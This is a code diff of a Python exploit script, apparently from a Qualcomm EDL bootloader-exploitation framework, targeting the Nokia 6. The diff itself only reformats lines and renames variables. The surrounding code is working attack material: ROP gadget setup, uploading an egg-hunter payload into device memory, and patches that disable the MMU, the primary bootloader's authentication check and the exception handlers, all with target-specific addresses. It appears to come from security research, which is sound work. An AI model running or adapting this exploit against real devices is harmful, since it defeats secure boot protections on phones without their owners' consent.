@@ -16,7 +16,7 @@ import target
 import constants
 from log import *
 from cmd import *
-from fw import Framework as p
+from fw import Framework as FH_FW
 from fw import *
 from fh import *
 import target as t
@@ -83,7 +83,7 @@ SP_AFTER_PRINTF_GADGET = 0x38c+36
 
 
 def rop_exec(va, r4):
-    Framework.copy(SP4,FIRST_SAVED_LR+4, 64)
+    Framework.copy(SP4, FIRST_SAVED_LR+4, 64)
     Framework.poke(GADGET_LEAK_R0_CONTROL_PC, 4, ORIGINAL_SAVED_LR)
     Framework.poke(GADGET_BLX_R12_CONTROL_PC, 4, GADGET_LEAK_R0)
     #Framework.poke(GADGET_BLX_R12_CONTROL_R1, 4, 0x12345678)
@@ -100,13 +100,14 @@ def rop():
 
 
 def eggsend(path, dst):
-    e = Egg(file(path,"rb").read(), dst)
+    e = Egg(file(path, "rb").read(), dst)
     e.send()
 
 
 def apply_patches(m, target):
     cmd = Commands()
-    m.patch(MODE_PBL, 0x103e8c, b"\x00\x50\x9F\xE5\x15\xFF\x2F\xE1\x00\x00\x0B\x08") # patch error handler
+    m.patch(MODE_PBL, 0x103e8c,
+            b"\x00\x50\x9F\xE5\x15\xFF\x2F\xE1\x00\x00\x0B\x08") # patch error handler
     m.patch32_pbl(0x110014, 0xE320F000) # disable MMU
 
     m.nop(MODE_PBL, 0x110678, 0x1107B8) # remove initialization of page tables
@@ -125,7 +126,7 @@ def apply_patches(m, target):
 
     # pbl auth patch
     m.patch32_pbl(0x103478, 0xEA000004)
-    
+
     # patch exception handlers in the programmer
     m.patch32_programmer(0x8008BCC, 0xE51FF004)
     m.patch32_programmer(0x8008BD0, target.addr_callback(cmd.DBG_INT))
@@ -135,7 +136,6 @@ def apply_patches(m, target):
 
     m.patch32_programmer(0x8008BDC, 0xE51FF004)
     m.patch32_programmer(0x8008BE0, target.addr_callback(cmd.DBG_INT))
-
 
     # SBL patcher - patch exception handlers in the SBL
     m.patch32_sbl(0x080225BC, 0xE51FF004)
@@ -149,7 +149,6 @@ def apply_patches(m, target):
 
     m.patch32_sbl(0x80068BC, 0xE51FF004)
     m.patch32_sbl(0x80068C0, target.addr_callback(cmd.DBG_DATA_ABORT_ENTRY))
-
 
     # ABL patcher - patch undef instruction handler in the ABL
     m.patch32_abl(0x8F6238AC, 0xE51FF004)
@@ -199,37 +198,41 @@ def magic():
     fhbin = file("../tmp/fh.bin", "wb")
     fhbin.write(fhdata)
     fhbin.close()
-
-    e = Egg(fhdata, target.fh_base_programmer+target.fh_scratch_offset)
-    e.send()
+    egg_hunter = Egg(fhdata, target.fh_base_programmer+target.fh_scratch_offset)
+    egg_hunter.send()
 
     I("uploading firehorse...")
-    e = Egg(file("../device/build/fh.payload","rb").read(), target.fh_base_programmer)
-    e.send()
+    egg_hunter = Egg(file("../device/build/fh.payload", "rb").read(), target.fh_base_programmer)
+    egg_hunter.send()
 
     I("initializing firehorse...")
-    p.exe_cmd(target.fh_base_programmer, cmd.INIT)
+    FH_FW.exe_cmd(target.fh_base_programmer, cmd.INIT)
 
     I("calling pbl patcher...")
-    p.exe_cmd(target.fh_base_programmer, cmd.PBL_PATCHER)
+    FH_FW.exe_cmd(target.fh_base_programmer, cmd.PBL_PATCHER)
 
     if "wait" in " ".join(sys.argv):
         I("waiting for LF")
         raw_input()
         I("you have 5 seconds")
         time.sleep(5)
-    
+
     Framework.exe(target.pbl_base_addr)
 
 
 
 t.add_target(name="nokia6", arch=32,
              programmer_path=r"target/nokia6/prog_emmc_firehose_8937_lite.mbn",
-             peekpoke_style=0, saved_lr=0x0802049b, saved_lr_addr=0x805cfdc,
-             pbl_base_addr=0x100000, pbl_copy_addr=0x8080000,
+             peekpoke_style=0,
+             saved_lr=0x0802049b,
+             saved_lr_addr=0x805cfdc,
+             pbl_base_addr=0x100000,
+             pbl_copy_addr=0x8080000,
              page_table_base=0x200000,
-             fh_base_programmer=0x80b0000, fh_base_aboot=0x8f900000,
-             fh_scratch_offset=0x20000, fh_saved_regs_offset=0x21000,
+             fh_base_programmer=0x80b0000,
+             fh_base_aboot=0x8f900000,
+             fh_scratch_offset=0x20000,
+             fh_saved_regs_offset=0x21000,
              egghunter_found_parts=0x8093000,
              egghunter_base=0x080af000,
              egg_xml='target/nokia6/egg-nokia6.xml',
